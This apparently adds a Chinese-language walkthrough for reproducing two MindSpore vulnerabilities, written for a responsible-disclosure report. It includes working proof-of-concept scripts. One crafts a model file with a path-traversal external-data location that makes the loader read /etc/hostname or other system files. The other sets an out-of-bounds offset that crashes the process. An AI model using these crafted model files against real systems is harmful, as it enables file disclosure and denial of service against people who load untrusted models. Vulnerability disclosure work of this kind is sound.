@@ -1,0 +1,183 @@
+================================================================================
+          MindSpore 漏洞 PoC 完整复现流程（从零开始）
+================================================================================
+
+前提：Windows 已安装 WSL2 + Ubuntu，已有用户 kiro
+梯子端口：7890（如不需要代理可跳过代理步骤）
+
+================================================================================
+第一步：打开 WSL 终端
+================================================================================
+
+在 Windows 中打开 PowerShell 或 CMD，输入：
+
+    wsl
+
+进入 Ubuntu 终端后，执行以下所有命令。
+
+================================================================================
+第二步：激活 Conda 环境
+================================================================================
+
+    source ~/miniconda3/bin/activate ms
+
+确认环境正确：
+
+    python --version
+
+预期输出：Python 3.9.x
+
+================================================================================
+第三步：进入工作目录
+================================================================================
+
+    mkdir -p ~/poc && cd ~/poc
+
+================================================================================
+第四步：生成 001 路径穿越 PoC
+================================================================================
+
+    cat > poc_001.py << 'EOF'
+import os
+import sys
+from mindspore.train.mind_ir_pb2 import ModelProto
+
+def create_malicious_mindir(target_file="/etc/hostname", output_dir="./poc_model"):
+    os.makedirs(output_dir, exist_ok=True)
+
+    model = ModelProto()
+    model.producer_name = "MindSpore"
+    model.model_version = "1"
+    model.little_endian = True
+
+    graph = model.graph
+    graph.name = "poc_graph"
+
+    param = graph.parameter.add()
+    param.name = "Default/param0:param0"
+    param.data_type = 1
+    param.dims.extend([1024])
+
+    abs_output = os.path.abspath(output_dir)
+    abs_target = os.path.abspath(target_file)
+    relative_path = os.path.relpath(abs_target, abs_output)
+
+    param.external_data.location = relative_path
+    param.external_data.offset = 0
+    param.external_data.length = 4096
+
+    mindir_path = os.path.join(output_dir, "malicious.mindir")
+    with open(mindir_path, "wb") as f:
+        f.write(model.SerializeToString())
+
+    print(f"[+] Malicious model created: {mindir_path}")
+    print(f"[+] Target file: {target_file}")
+    print(f"[+] Traversal path: {relative_path}")
+    return mindir_path
+
+if __name__ == "__main__":
+    target = sys.argv[1] if len(sys.argv) > 1 else "/etc/hostname"
+    create_malicious_mindir(target)
+EOF
+
+    python poc_001.py /etc/hostname
+
+预期输出：
+    [+] Malicious model created: ./poc_model/malicious.mindir
+    [+] Target file: /etc/hostname
+    [+] Traversal path: ../../../../etc/hostname
+
+================================================================================
+第五步：运行 001 strace 验证（关键截图！）
+================================================================================
+
+    sudo strace -e trace=openat /home/kiro/miniconda3/envs/ms/bin/python -c "
+    import mindspore
+    try:
+        mindspore.load('./poc_model/malicious.mindir')
+    except:
+        pass
+    " 2>&1 | grep -E "hostname|etc/passwd"
+
+预期输出（截图保存这个！）：
+    openat(AT_FDCWD, "/home/kiro/poc/poc_model/../../../../etc/hostname", O_RDONLY) = 3
+
+★★★ 看到这行就证明 001 路径穿越漏洞存在 ★★★
+★★★ 用 Win+Shift+S 截图保存 ★★★
+
+================================================================================
+第六步：生成 002 堆越界读取 PoC
+================================================================================
+
+    cat > poc_002.py << 'EOF'
+import os
+from mindspore.train.mind_ir_pb2 import ModelProto
+
+def create_oob_poc(output_dir="./oob_model"):
+    os.makedirs(output_dir, exist_ok=True)
+
+    data_file = os.path.join(output_dir, "data.bin")
+    with open(data_file, "wb") as f:
+        f.write(b"\x01" + b"\x00" * 63)
+
+    model = ModelProto()
+    model.producer_name = "MindSpore"
+    model.model_version = "1"
+    model.little_endian = True
+
+    graph = model.graph
+    graph.name = "oob_graph"
+
+    param = graph.parameter.add()
+    param.name = "Default/param0:param0"
+    param.data_type = 1
+    param.dims.extend([256])
+
+    param.external_data.location = "data.bin"
+    param.external_data.offset = 0x7FFFFFFF
+    param.external_data.length = 64
+
+    mindir_path = os.path.join(output_dir, "oob_model.mindir")
+    with open(mindir_path, "wb") as f:
+        f.write(model.SerializeToString())
+
+    print(f"[+] OOB PoC created: {mindir_path}")
+    print(f"[+] File size: 64 bytes, offset: 0x7FFFFFFF (out of bounds!)")
+    return mindir_path
+
+if __name__ == "__main__":
+    create_oob_poc()
+EOF
+
+    python poc_002.py
+
+预期输出：
+    [+] OOB PoC created: ./oob_model/oob_model.mindir
+    [+] File size: 64 bytes, offset: 0x7FFFFFFF (out of bounds!)
+
+================================================================================
+第七步：运行 002 崩溃验证（关键截图！）
+================================================================================
+
+    /home/kiro/miniconda3/envs/ms/bin/python -c "
+    import mindspore
+    mindspore.load('./oob_model/oob_model.mindir')
+    "
+
+预期输出（截图保存这个！）：
+    Segmentation fault
+
+★★★ 看到 Segmentation fault 就证明 002 堆越界漏洞存在 ★★★
+★★★ 用 Win+Shift+S 截图保存 ★★★
+
+================================================================================
+完成！你现在有两张截图作为 SRC 提交证据
+================================================================================
+
+001 证据：strace 显示 openat 打开了穿越路径的文件
+002 证据：Segmentation fault 证明堆越界导致进程崩溃 (DoS)
+
+将截图 + 报告（txt文件）合并为 PDF，GPG 加密后发送至：
+    mindspore-security@mindspore.cn
+
+================================================================================
